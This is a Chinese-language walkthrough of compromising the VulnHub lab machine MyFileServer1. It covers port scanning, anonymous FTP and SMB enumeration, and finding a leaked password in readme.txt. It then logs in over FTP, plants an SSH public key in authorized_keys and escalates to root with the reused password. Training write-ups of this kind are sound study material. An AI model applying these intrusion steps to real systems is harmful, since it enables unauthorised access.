+++
date = '2026-11-26T18:30:33+08:00'
draft = false
title = '[VulnHub靶机]MyFileServer1渗透记录'
tags = ['渗透','Vulnhub','ftp']
categories = ["靶机渗透"]
+++

## 信息收集

### 主机发现&端口扫描

攻击机IP: 10.10.10.3  
靶机IP: 10.10.10.26

```shell
┌──(kali㉿kali)-[~/MyFileServer1]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 10.10.10.3
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.1      00:50:56:c0:00:08       VMware, Inc.
10.10.10.2      00:50:56:fc:41:2a       VMware, Inc.
10.10.10.26     00:0c:29:7d:9a:5d       VMware, Inc.
10.10.10.254    00:50:56:f8:1d:31       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.033 seconds (125.92 hosts/sec). 4 responded
```

探测端口开放情况

```shell
┌──(kali㉿kali)-[~/MyFileServer1]
└─$ sudo nmap -sT --min-rate 10000 -p- 10.10.10.26
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-26 18:36 +0800
Nmap scan report for 10.10.10.26
Host is up (0.00038s latency).
Not shown: 64504 filtered tcp ports (no-response), 19 filtered tcp ports (host-unreach), 1004 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
2121/tcp  open  ccproxy-ftp
20048/tcp open  mountd
MAC Address: 00:0C:29:7D:9A:5D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 13.74 seconds
```

详细扫描

```shell
┌──(kali㉿kali)-[~/MyFileServer1]
└─$ sudo nmap -sT -sV -sC -O -p21,22,80,111,445,2049,2121,20048 10.10.10.26
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-26 18:38 +0800
Nmap scan report for 10.10.10.26
Host is up (0.00053s latency).

PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.2
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.10.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    3 0        0              16 Feb 19  2020 pub [NSE: writeable]
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 75:fa:37:d1:62:4a:15:87:7e:21:83:b9:2f:ff:04:93 (RSA)
|   256 b8:db:2c:ca:e2:70:c3:eb:9a:a8:cc:0e:a2:1c:68:6b (ECDSA)
|_  256 66:a3:1b:55:ca:c2:51:84:41:21:7f:77:40:45:d4:9f (ED25519)
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS))
|_http-title: My File Server
|_http-server-header: Apache/2.4.6 (CentOS)
| http-methods:
|_  Potentially risky methods: TRACE
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      20048/tcp   mountd
|   100005  1,2,3      20048/tcp6  mountd
|   100005  1,2,3      20048/udp   mountd
|   100005  1,2,3      20048/udp6  mountd
|   100021  1,3,4      36694/tcp6  nlockmgr
|   100021  1,3,4      42794/udp   nlockmgr
|   100021  1,3,4      51309/udp6  nlockmgr
|   100021  1,3,4      53925/tcp   nlockmgr
|   100024  1          40094/udp6  status
|   100024  1          47044/tcp6  status
|   100024  1          51811/udp   status
|   100024  1          59957/tcp   status
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
445/tcp   open  netbios-ssn Samba smbd 4.9.1 (workgroup: SAMBA)
2049/tcp  open  nfs_acl     3 (RPC #100227)
2121/tcp  open  ftp         ProFTPD 1.3.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: ERROR
20048/tcp open  mountd      1-3 (RPC #100005)
MAC Address: 00:0C:29:7D:9A:5D (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|storage-misc|router
Running (JUST GUESSING): Linux 2.6.X|3.X|4.X|5.X (96%), Synology DiskStation Manager 5.X (93%), MikroTik RouterOS 7.X (89%)
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/a:synology:diskstation_manager:5.2 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
Aggressive OS guesses: Linux 2.6.32 - 3.13 (96%), Linux 3.4 - 3.10 (96%), Linux 2.6.32 - 3.10 (96%), Linux 2.6.39 (96%), Linux 3.10 (94%), Synology DiskStation Manager 5.2-5644 (93%), Linux 2.6.32 (93%), Linux 2.6.32 - 3.5 (91%), Linux 3.0 - 3.1 (90%), Linux 3.2 - 3.16 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: FILESERVER; OS: Unix

Host script results:
|_clock-skew: mean: 6h10m02s, deviation: 3h10m30s, median: 8h00m00s
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.9.1)
|   Computer name: localhost
|   NetBIOS computer name: FILESERVER\x00
|   Domain name: \x00
|   FQDN: localhost
|_  System time: 2026-11-27T00:08:43+05:30
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-11-26T18:38:42
|_  start_date: N/A
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.46 seconds
```

漏洞扫描

```shell
┌──(kali㉿kali)-[~/MyFileServer1]
└─$ sudo nmap --script=vuln -p21,22,80,111,445,2049,2121,20048 10.10.10.26
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-26 18:39 +0800
Nmap scan report for 10.10.10.26
Host is up (0.00034s latency).

PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
|_http-trace: TRACE is enabled
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum:
|_  /icons/: Potentially interesting folder w/ directory listing
111/tcp   open  rpcbind
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
2121/tcp  open  ccproxy-ftp
20048/tcp open  mountd
MAC Address: 00:0C:29:7D:9A:5D (VMware)

Host script results:
| smb-vuln-regsvc-dos:
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_
|_smb-vuln-ms10-061: false
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 44.19 seconds
```

### FTP信息收集

尝试使用匿名用户登录21端口的FTP服务, 成功

```shell
┌──(kali㉿kali)-[~/MyFileServer1]
└─$ ftp 10.10.10.26
Connected to 10.10.10.26.
220 (vsFTPd 3.0.2)
Name (10.10.10.26:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

查看服务器上的内容, 发现pub目录

```shell
ftp> ls
229 Entering Extended Passive Mode (|||5471|).
150 Here comes the directory listing.
drwxrwxrwx    3 0        0              16 Feb 19  2020 pub
226 Directory send OK.
```

pub目录中有个log文件, 里面又有很多文件

```shell
ftp> cd pub
250 Directory successfully changed.
ftp> ls -a
229 Entering Extended Passive Mode (|||5114|).
150 Here comes the directory listing.
drwxrwxrwx    3 0        0              16 Feb 19  2020 .
drwxr-xr-x    3 0        0              16 Feb 18  2020 ..
drwxr-xr-x    9 0        0            4096 Feb 19  2020 log
226 Directory send OK.
ftp> cd log
250 Directory successfully changed.
ftp> ls -a
229 Entering Extended Passive Mode (|||5435|).
150 Here comes the directory listing.
drwxr-xr-x    9 0        0            4096 Feb 19  2020 .
drwxrwxrwx    3 0        0              16 Feb 19  2020 ..
drwxr-xr-x    2 0        0            4096 Feb 19  2020 anaconda
drwxr-x---    2 0        0              22 Feb 19  2020 audit
-rw-r--r--    1 0        0            7033 Feb 19  2020 boot.log
-rw-------    1 0        0           10752 Feb 19  2020 btmp
-rw-r--r--    1 0        0            9161 Feb 19  2020 cron
-rw-r--r--    1 0        0           31971 Feb 19  2020 dmesg
-rw-r--r--    1 0        0           31971 Feb 19  2020 dmesg.old
drwxr-xr-x    2 0        0               6 Feb 19  2020 glusterfs
drwx------    2 0        0              39 Feb 19  2020 httpd
-rw-r--r--    1 0        0          292584 Feb 19  2020 lastlog
-rw-------    1 0        0            3764 Feb 19  2020 maillog
-rw-------    1 0        0         1423423 Feb 19  2020 messages
drwx------    2 0        0               6 Feb 19  2020 ppp
drwx------    4 0        0              43 Feb 19  2020 samba
-rw-------    1 0        0           63142 Feb 19  2020 secure
-rw-------    1 0        0               0 Feb 19  2020 spooler
-rw-------    1 0        0               0 Feb 19  2020 tallylog
drwxr-xr-x    2 0        0              22 Feb 19  2020 tuned
-rw-r--r--    1 0        0           58752 Feb 19  2020 wtmp
-rw-------    1 0        0             100 Feb 19  2020 xferlog
-rw-------    1 0        0           18076 Feb 19  2020 yum.log
226 Directory send OK.
```

下载所有文件

```shell
ftp> prompt 
Interactive mode off.
ftp> mget *
```

由于权限的原因, 只能下载部分文件

```shell
┌──(kali㉿kali)-[~/MyFileServer1]
└─$ ll
总计 432
-rw-rw-r-- 1 kali kali   7033 2020年 2月19日 boot.log
-rw-rw-r-- 1 kali kali   9161 2020年 2月19日 cron
-rw-rw-r-- 1 kali kali  31971 2020年 2月19日 dmesg
-rw-rw-r-- 1 kali kali  31971 2020年 2月19日 dmesg.old
-rw-rw-r-- 1 kali kali 292584 2020年 2月19日 lastlog
-rw-rw-r-- 1 kali kali  58752 2020年 2月19日 wtmp
```

### SMB信息收集

匿名列出服务器的SMB共享

```shell
┌──(kali㉿kali)-[~/MyFileServer1]
└─$ smbclient -L 10.10.10.26 -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        smbdata         Disk      smbdata
        smbuser         Disk      smbuser
        IPC$            IPC       IPC Service (Samba 4.9.1)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.26 failed (Error NT_STATUS_HOST_UNREACHABLE)
Unable to connect with SMB1 -- no workgroup available
```

查看smbdata共享

```shell
┌──(kali㉿kali)-[~/MyFileServer1]
└─$ smbclient //10.10.10.26/smbdata -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Nov 27 02:40:20 2026
  ..                                  D        0  Tue Feb 18 19:47:54 2020
  anaconda                            D        0  Tue Feb 18 19:48:15 2020
  audit                               D        0  Tue Feb 18 19:48:15 2020
  boot.log                            N     6120  Tue Feb 18 19:48:16 2020
  btmp                                N      384  Tue Feb 18 19:48:16 2020
  cron                                N     4813  Tue Feb 18 19:48:16 2020
  dmesg                               N    31389  Tue Feb 18 19:48:16 2020
  dmesg.old                           N    31389  Tue Feb 18 19:48:16 2020
  glusterfs                           D        0  Tue Feb 18 19:48:16 2020
  lastlog                             N   292292  Tue Feb 18 19:48:16 2020
  maillog                             N     1982  Tue Feb 18 19:48:16 2020
  messages                            N   684379  Tue Feb 18 19:48:17 2020
  ppp                                 D        0  Tue Feb 18 19:48:17 2020
  samba                               D        0  Tue Feb 18 19:48:17 2020
  secure                              N    11937  Tue Feb 18 19:48:17 2020
  spooler                             N        0  Tue Feb 18 19:48:17 2020
  tallylog                            N        0  Tue Feb 18 19:48:17 2020
  tuned                               D        0  Tue Feb 18 19:48:17 2020
  wtmp                                N    25728  Tue Feb 18 19:48:17 2020
  xferlog                             N      100  Tue Feb 18 19:48:17 2020
  yum.log                             N    10915  Tue Feb 18 19:48:17 2020
  sshd_config                         N     3906  Wed Feb 19 15:46:38 2020

                19976192 blocks of size 1024. 18285032 blocks available
```

全部下载

```shell
smb: \> prompt 
smb: \> recurse 
smb: \> mget *
```

smbuser无法登录

```shell
┌──(kali㉿kali)-[~/MyFileServer1/smbuser]
└─$ smbclient //10.10.10.26/smbuser -N
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED
```

### nfs信息收集

查看nfs开放目录, 发现/smbdata目录且只对`192.168.56.0/24`网段开放, 名称与之前smb上看到的一样, 可能是同一个目录

```shell
┌──(kali㉿kali)-[~/MyFileServer1/smbuser]
└─$ showmount -e 10.10.10.26          
Export list for 10.10.10.26:
/smbdata 192.168.56.0/24
```

### Web信息收集

访问80端口, 只有一个指向外部的超链接和一行文字, 没有任何信息

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/MyFileServer1/80%E7%AB%AF%E5%8F%A3.avif)

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/MyFileServer1/80%E7%AB%AF%E5%8F%A3%E6%BA%90%E7%A0%81.avif)

目录爆破, 发现/readme.txt

```shell
┌──(kali㉿kali)-[~/MyFileServer1]
└─$ dirsearch -u http://10.10.10.26/  

  _|. _ _  _  _  _ _|_    v0.4.4
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12295

Target: http://10.10.10.26/

[19:14:48] Scanning: 
[19:14:54] 403 -   210B - /cgi-bin/                                         
[19:14:56] 200 -   174B - /index.html                                       
[19:14:59] 200 -    25B - /readme.txt                                       
                                                                             
Task Completed
```

访问得到一个密码: `rootroot1`

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/MyFileServer1/readme.avif)

## 信息提取

通过搜索username, 发现靶机上存在一个叫`smbuser`的用户

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/MyFileServer1/%E5%8F%91%E7%8E%B0smbuser%E7%94%A8%E6%88%B7.avif)

查看sshd_config文件, 发现ssh仅允许使用`.ssh/authorized_keys`密钥登录, 不允许使用密码登录

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/MyFileServer1/%E6%9F%A5%E7%9C%8Bssh%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF.avif)

## FTP上传SSH公钥

尝试使用用户名`smbuser`, 密码`rootroot1`登录ftp服务

```shell
┌──(kali㉿kali)-[~/MyFileServer1/smbdata]
└─$ ftp 10.10.10.26     
Connected to 10.10.10.26.
220 (vsFTPd 3.0.2)
Name (10.10.10.26:kali): smbuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

查看当前目录

```shell
ftp> pwd
Remote directory: /home/smbuser
ftp> ls -lah
229 Entering Extended Passive Mode (|||5680|).
150 Here comes the directory listing.
drwx------    2 1000     1000           79 Feb 18  2020 .
drwxr-xr-x    3 0        0              20 Feb 19  2020 ..
-rw-------    1 1000     1000           27 Feb 20  2020 .bash_history
-rw-r--r--    1 1000     1000           18 Mar 05  2015 .bash_logout
-rw-r--r--    1 1000     1000          193 Mar 05  2015 .bash_profile
-rw-r--r--    1 1000     1000          231 Mar 05  2015 .bashrc
226 Directory send OK.
```

当前为用户`smbuser`的家目录, 根据之前的sshd_config文件, 如果我们能通过FTP上传ssh公钥, 就可以通过密钥登录服务器  
生成密钥对

```shell
┌──(kali㉿kali)-[~/MyFileServer1]
└─$ ssh-keygen
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/kali/.ssh/id_ed25519): Pieyue
Enter passphrase for "Pieyue" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in Pieyue
Your public key has been saved in Pieyue.pub
The key fingerprint is:
SHA256:s1dev5aQHCe6fM2rsuR+EBnasgF3MJR1un5dzfp/F94 kali@kali
The key's randomart image is:
+--[ED25519 256]--+
|        .++. .   |
|       . o.oo    |
|        o +.o    |
|         + +.o o.|
|        S +.= * +|
|         +.= =.+.|
|        . oo+.*.=|
|         .o+.o BE|
|          .+=.ooB|
+----[SHA256]-----+
```

将公钥上传至服务器

```shell
ftp> mkdir .ssh
257 "/home/smbuser/.ssh" created
ftp> cd .ssh
250 Directory successfully changed.
ftp> put /home/kali/MyFileServer1/Pieyue.pub ./authorized_keys
local: /home/kali/MyFileServer1/Pieyue.pub remote: ./authorized_keys
229 Entering Extended Passive Mode (|||5719|).
150 Ok to send data.
100% |**************************************************************************************************************************|    91        1.08 MiB/s    00:00 ETA
226 Transfer complete.
91 bytes sent in 00:00 (144.49 KiB/s)
```

使用私钥成功登录SSH

```shell
┌──(kali㉿kali)-[~/MyFileServer1]
└─$ ssh -i Pieyue smbuser@10.10.10.26
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
   ##############################################################################################
   #                                      Armour Infosec                                        #
   #                         --------- www.armourinfosec.com ------------                       #
   #                                    My File Server - 1                                      #
   #                               Designed By  :- Akanksha Sachin Verma                        #
   #                               Twitter      :- @akankshavermasv                             #
   ##############################################################################################

Last login: Thu Feb 20 16:42:21 2020
[smbuser@fileserver ~]$
```

## 权限提升

尝试使用`rootroot1`直接切换到root用户, 成功

```shell
[smbuser@fileserver /]$ su root
密码：
[root@fileserver /]# whoami
root
```

读取flag

```shell
[root@fileserver /]# cd /root
[root@fileserver ~]# ls -a 
.  ..  .bash_history  .bash_logout  .bash_profile  .bashrc  .cshrc  .pki  proof.txt  .ssh  .tcshrc  .viminfo
[root@fileserver ~]# cat proof.txt 
Best of Luck
af52e0163b03cbf7c6dd146351594a43
```
